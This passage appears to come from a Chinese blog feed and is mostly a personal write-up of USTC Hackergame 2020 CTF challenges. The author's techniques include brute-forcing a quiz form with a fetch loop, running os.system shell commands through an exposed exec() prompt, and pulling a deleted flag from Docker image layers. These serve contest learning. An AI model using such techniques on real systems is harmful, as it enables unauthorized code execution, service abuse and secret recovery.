年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment 